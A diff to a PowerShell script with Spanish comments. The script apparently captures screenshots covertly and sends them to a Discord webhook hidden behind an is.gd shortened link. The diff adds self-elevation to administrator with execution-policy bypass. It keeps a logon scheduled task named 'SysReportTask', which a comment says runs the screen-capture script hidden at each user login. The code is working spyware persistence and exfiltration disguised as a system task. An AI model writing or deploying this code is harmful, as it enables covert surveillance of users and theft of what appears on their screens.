@@ -1,3 +1,10 @@
+# Verificar si el script se está ejecutando con privilegios elevados (como administrador)
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    # Si no se está ejecutando como administrador, relanzar el script con privilegios elevados
+    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    Exit
+}
+
 # Definir la URL del webhook de Discord
 $hookurl = "https://is.gd/xSsigk"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de tu webhook de Discord
 
@@ -65,7 +72,7 @@ $scriptPath = Join-Path -Path $directoryName -ChildPath $scriptName
 $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8 -Force
 
 # Configurar la tarea programada para ejecutar el script al iniciar sesión del usuario
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
 $trigger = New-ScheduledTaskTrigger -AtLogon
 $task = New-ScheduledTask -Action $action -Trigger $trigger -Description "Tarea programada para ejecutar el script de captura de pantalla de manera oculta al iniciar sesión del usuario" -TaskName "SysReportTask"
 Register-ScheduledTask -InputObject $task -Force | Out-Null
